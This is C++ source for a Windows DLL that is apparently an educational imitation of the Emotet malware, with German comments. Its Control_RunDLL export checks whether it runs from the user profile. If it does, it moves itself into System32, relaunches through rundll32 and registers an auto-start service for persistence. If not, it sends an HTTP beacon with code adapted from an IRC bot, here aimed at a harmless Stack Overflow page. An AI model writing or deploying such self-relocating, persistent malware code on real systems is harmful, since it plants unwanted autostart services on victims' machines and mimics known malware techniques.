#include <iostream>
#include <Windows.h>
#include <vector>
#include <iostream>
#include <stdio.h>
#include <tchar.h>
#include <cstdlib>
#include <string>
#include <algorithm>
#include <thread>
#include <stdlib.h>
#include <winsock.h>
#include <wininet.h>
#include <shellapi.h>
#include <mmsystem.h>


EXTERN_C IMAGE_DOS_HEADER __ImageBase;

std::wstring s2ws(const std::string& s); 

void dllInUserprofile(std::string exPath);
void dllNotInUserprofile();
void selfCopy(std::string exPath, std::string targetPath);
PROCESS_INFORMATION launchProcess(std::string app, std::string arg);
void createService(std::string targetPath);
VOID visit(LPVOID param);

typedef struct vs {
    char host[128];
    char referer[128];
    char chan[128];
    SOCKET sock;
    BOOL silent;
    BOOL gotinfo;
} vs;
HANDLE ih;
extern "C" __declspec (dllexport) void __cdecl Control_RunDLL(
   HWND      hwnd,         // handle to owner window
   HINSTANCE hinst,        // instance handle for the DLL
   LPTSTR    lpCmdLine,    // string the DLL will parse
   int       nCmdShow      // show state
)
{
 
    //Pfad der dll Abfragen
    LPTSTR  strDLLPath1 = new TCHAR[_MAX_PATH];
    ::GetModuleFileName((HINSTANCE)&__ImageBase, strDLLPath1, _MAX_PATH);
    std::string exPath = std::string(strDLLPath1);

    //Userverzeichnis auslesen
   char* userprofile = getenv("USERPROFILE");
    std::string userprofileString(userprofile);
    std::cout << userprofileString;
    
    if (exPath.find(userprofileString) != std::string::npos) {
        dllInUserprofile(exPath);
    }
    else {
        
       
        vs vis;
        ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (ih == NULL)
        {
            printf("%s\n", "null");
        }

        strncpy(vis.host, "https://stackoverflow.com/questions/4764680/how-to-get-the-location-of-the-dll-currently-executing", sizeof(vis.host) - 1);
        vis.silent = FALSE;

        visit(&vis);
        MessageBox(0, "Http-Request abgesendet", "func", 0);
    }



 




 
}

std::wstring s2ws(const std::string& s) //Source:https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
{
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}

void dllInUserprofile(std::string exPath) {
    std::string target = "C:\\Windows\\System32\\emotetImitation.foo";
    selfCopy(exPath, target);
    PROCESS_INFORMATION pi = launchProcess("c:\\Windows\\system32\\rundll32.exe", target+ " Control_RunDLL");
    std::string piS = std::to_string((unsigned int)pi.dwProcessId);
    createService(target);
}

void selfCopy(std::string exPath, std::string target) {
    //Pfade zusammenbasteln

   
    //Datentyp anpassen
    std::wstring sTemp = s2ws(exPath);
    LPCWSTR sourceW = sTemp.c_str();
    std::wstring tTemp = s2ws(target);
    LPCWSTR targetW = tTemp.c_str();

    MoveFileExW(sourceW, targetW, 1);
}

void createService(std::string targetPath) {
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    TCHAR szPath[MAX_PATH];
    std::string command = "rundll32.exe \"" + targetPath + "\",Control_RunDLL";
    std::copy(command.begin(), command.end(), szPath);
    /*if (!GetModuleFileNameA(nullptr, szPath, MAX_PATH))
    {
        printf("Cannot install service (%d)\n", GetLastError());
        return;
    }*/

    // Get a handle to the SCM database. 

    schSCManager = OpenSCManager(
        NULL,                    // local computer
        NULL,                    // ServicesActive database 
        SC_MANAGER_ALL_ACCESS);  // full access rights 

    if (NULL == schSCManager)
    {
        printf("OpenSCManager failed (%d)\n", GetLastError());
        return;
    }

    // Create the service
    LPCSTR SVCNAME = "TestService";
    schService = CreateService(
        schSCManager,              // SCM database 
        SVCNAME,                   // name of service 
        SVCNAME,                   // service name to display 
        SERVICE_ALL_ACCESS,        // desired access 
        SERVICE_WIN32_OWN_PROCESS, // service type 
        SERVICE_AUTO_START,      // start type 
        SERVICE_ERROR_NORMAL,      // error control type 
        szPath,                    // path to service's binary 
        NULL,                      // no load ordering group 
        NULL,                      // no tag identifier 
        NULL,                      // no dependencies 
        NULL,                      // LocalSystem account 
        NULL);                     // no password 

    if (schService == NULL)
    {
        MessageBox(0,"CreateService failed", "Service",0);
        CloseServiceHandle(schSCManager);
        return;
    }
    else MessageBox(0, "CreateService", "Service", 0);

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

PROCESS_INFORMATION launchProcess(std::string app, std::string arg) //Source: https://stackoverflow.com/questions/46831863/how-do-i-call-the-unicode-function-createprocessw-in-c-to-launch-a-windows-exe
{

    // Prepare handles.
    STARTUPINFOW si;
    PROCESS_INFORMATION pi; // The function returns this
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    //Prepare CreateProcess args
    std::wstring app_w(app.length(), L' '); // Make room for characters
    std::copy(app.begin(), app.end(), app_w.begin()); // Copy string to wstring.

    std::wstring arg_w(arg.length(), L' '); // Make room for characters
    std::copy(arg.begin(), arg.end(), arg_w.begin()); // Copy string to wstring.

    std::wstring input = app_w + L" " + arg_w;
    wchar_t* arg_concat = const_cast<wchar_t*>(input.c_str());
    const wchar_t* app_const = app_w.c_str();

    // Start the child process.
    if (!CreateProcessW(
        app_const,      // app path
        arg_concat,     // Command line (needs to include app path as first argument. args seperated by whitepace)
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
        )
    {
        MessageBox(0,"CreateProcess failed", "func",0);
        //throw std::exception("Could not create child process");
    }
    else
    {
        // Return process handle
        return pi;
    }
    return pi;

}

VOID visit(LPVOID param) //source: https://gist.github.com/gin1314/3434391
{
    URL_COMPONENTS url;
    HINTERNET ch, req;
    DWORD dwRead;
    // char szBuffer[1024];
    BYTE szBuffer = 0;
    LPVOID lpMsgBuf;
    const char* accept = "*/*";
    char* error = "error visiting URL.";
    vs visit;
    char vhost[128];
    int vport;
    char vuser[128];
    char vpass[128];
    char vpath[256];

    visit = *((vs*)param);
    vs* vsp = (vs*)param;
    vsp->gotinfo = TRUE;

    // zero out string varaiables
    memset(vhost, 0, sizeof(vhost));
    memset(vuser, 0, sizeof(vuser));
    memset(vpass, 0, sizeof(vpass));
    memset(vpath, 0, sizeof(vpath));

    // zero out url structure and set options
    memset(&url, 0, sizeof(url));
    url.dwStructSize = sizeof(url);
    url.dwHostNameLength = 1;
    url.dwUserNameLength = 1;
    url.dwPasswordLength = 1;
    url.dwUrlPathLength = 1;

    do {
        // crack the url (break it into its main parts)
        if (!InternetCrackUrl(visit.host, strlen(visit.host), 0, &url)) {
            if (!visit.silent)
                printf("%s\n", "invalid url");
            // irc_privmsg(visit.sock, visit.chan, "invalid URL.", FALSE);
            break;
        }

        // copy url parts into variables
        if (url.dwHostNameLength > 0) strncpy(vhost, url.lpszHostName, url.dwHostNameLength);
        vport = url.nPort;
        if (url.dwUserNameLength > 0) strncpy(vuser, url.lpszUserName, url.dwUserNameLength);
        if (url.dwPasswordLength > 0) strncpy(vpass, url.lpszPassword, url.dwPasswordLength);
        if (url.dwUrlPathLength > 0) strncpy(vpath, url.lpszUrlPath, url.dwUrlPathLength);

        ch = InternetConnect(ih, vhost, vport, vuser, vpass, INTERNET_SERVICE_HTTP, 0, 0);
        if (ch == NULL) {
            if (!visit.silent)
                printf("%s\n", "error InternetConnect");
            // irc_privmsg(visit.sock, visit.chan, error, FALSE);
            break;
        }

        req = HttpOpenRequest(ch, NULL, vpath, NULL, visit.referer, &accept, INTERNET_FLAG_NO_UI, 0);
        if (req == NULL) {
            if (!visit.silent)
                printf("%s\n", "error HttpOpenRequest");
            // irc_privmsg(visit.sock, visit.chan, error, FALSE);
            break;
        }

        if (HttpSendRequest(req, NULL, 0, NULL, 0)) {
            if (!visit.silent)
                printf("%s\n", "success HttpSendRequest");
            //   if ( InternetReadFile(req, &szBuffer, 1024, &dwRead) ) {
   //                printf("%s\n", &szBuffer);
            //   } else {

                  // FormatMessage( 
                  //     FORMAT_MESSAGE_ALLOCATE_BUFFER | 
                  //     FORMAT_MESSAGE_FROM_SYSTEM | 
                  //     FORMAT_MESSAGE_IGNORE_INSERTS,
                  //     NULL,
                  //     GetLastError(),
                  //     0, // Default language
                  //     (LPTSTR) &lpMsgBuf,
                  //     0,
                  //     NULL 
                  // );
                  // // Process any inserts in lpMsgBuf.
                  // // ...
                  // // Display the string.
                  // printf("%s\n", lpMsgBuf);
                  // // Free the buffer.
                  // LocalFree( lpMsgBuf );

            //   }

            while (InternetReadFile(req, &szBuffer, 1, &dwRead) == TRUE) {
                if (dwRead == 0)
                {
                    break;
                }
                printf("%s", &szBuffer);
            }

            // irc_privmsg(visit.sock, visit.chan, "url visited.", FALSE);
        }
        else {
            if (!visit.silent)
                printf("%s\n", "error HttpSendRequest");
            // irc_privmsg(visit.sock, visit.chan, error, FALSE);
        }
    } while (0); // always false, so this never loops, only helps make error handling easier

    InternetCloseHandle(ch);
    InternetCloseHandle(req);
    // return 0;
}
